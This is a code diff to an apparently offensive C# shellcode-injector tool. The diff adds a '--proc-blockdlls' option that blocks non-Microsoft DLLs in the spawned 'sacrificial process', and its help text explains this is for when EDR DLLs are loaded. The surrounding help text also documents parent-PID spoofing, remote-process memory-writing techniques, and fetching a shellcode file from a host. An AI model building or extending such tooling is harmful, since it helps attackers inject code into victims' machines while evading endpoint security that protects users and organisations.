@@ -29,7 +29,8 @@ namespace Shellcode_Injector
             {
                 { "cmd", "C:\\Windows\\System32\\notepad.exe"},
                 { "cwd", "C:\\Windows\\System32"},
-                { "spoof_ppid", false }
+                { "spoof_ppid", false },
+                { "block_dlls", false }
             };
 
             //standard or ntsection
@@ -79,6 +80,10 @@ namespace Shellcode_Injector
                 {
                     process["spoof_ppid"] = true;
                 }
+                else if (current.StartsWith("--proc-blockdlls"))
+                {
+                    process["block_dlls"] = true;
+                }
                 else if (current.StartsWith("--proc-ppid") && i + 1 < args.Length)
                 {
                     var pp = args[i + 1];
@@ -96,7 +101,7 @@ namespace Shellcode_Injector
                     exec["technique"] = args[i + 1];
                 }
                 //Help message
-                else if (current.StartsWith("--help")) 
+                else if (current.StartsWith("--help"))
                 {
                     PrintHelp();
                     Environment.Exit(0);
@@ -126,6 +131,8 @@ Process creation, these flags control the process that will be created for shell
 
 --proc-ppid          Integer value to specify the PPID that the spawened process will have, default value: 0
 
+--proc-blockdlls     Boolean value to specify if the sacrifical process should block the loading of DLLs not signed by microsoft, default valie: false
+
 
 Memory allocation technique, possible values are standard or ntsection
 standard   ->  VirtualAllocEx, VirtualProtextEx, WriteProcessMemory
@@ -151,6 +158,7 @@ shellcode_injector.exe --host http://localhost:8080 --file calc.bin --mem-alloc 
 Note: 
 In order to spoof the parent process ID for the newly created process, you have to have the necessary permissions...
 eg. with a regular user you cant use a SYSTEM level process for ppid.
+Setting --proc-blockdlls will set the PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY property on the sacrifical process, this can be useful when EDR dlls are being loaded
             ";
 
             Console.WriteLine(help_msg);
